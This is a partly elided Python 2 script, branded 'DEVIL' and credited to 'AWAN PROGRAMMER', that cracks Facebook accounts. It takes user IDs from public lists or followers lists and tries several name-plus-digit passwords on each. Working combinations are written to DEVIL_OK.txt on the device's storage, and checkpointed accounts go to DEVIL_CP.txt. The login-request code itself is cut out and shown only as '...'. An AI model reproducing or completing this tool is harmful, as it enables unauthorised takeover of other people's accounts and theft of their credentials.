...
def menu():
    ...
    try:
        ...
        print logo
        print ''
        print '\t Logged in id has DEVIL_CP\x1b[0;97m'
        print ''
...
def a_s():
    ...
    if a_s == '1':
        ...
        print logo
        print ''
        print '\tName +digit pass public cracking'
        print ''
        ...
        print logo
        print ''
        print '\tName +Digit pass followers cracking'
        print ''
        print ' For example: 123 , 1234 , 1234, 786 , 12 , 1122'
        print ''
        p1 = raw_input(' Name + digit: ')
    ...
    print 47 * '-'
    print ''
    print '\t\x1b[1;32mCreated by: AWAN PROGRAMMER\x1b[0;97m'
    print ''
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;32m[DEVIL_OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '[DEVIL_CP] ' + uid + ' | ' + pass1
                cp = open('DEVIL_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;32m[DEVIL_OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '[DEVIL_CP] ' + uid + ' | ' + pass2
                    cp = open('DEVIL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;32m[DEVIL_OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '[DEVIL_CP] ' + uid + ' | ' + pass3
                        cp = open('DEVIL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;32m[DEVIL_OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/DEVIL_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '[DEVIL_CP] ' + uid + ' | ' + pass4
                            cp = open('DEVIL_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    print 47 * '-'
    print ''
    print '\tCreated by: AWAN PROGRAMMER'
    print ''
    print 47 * '-'
    print ''
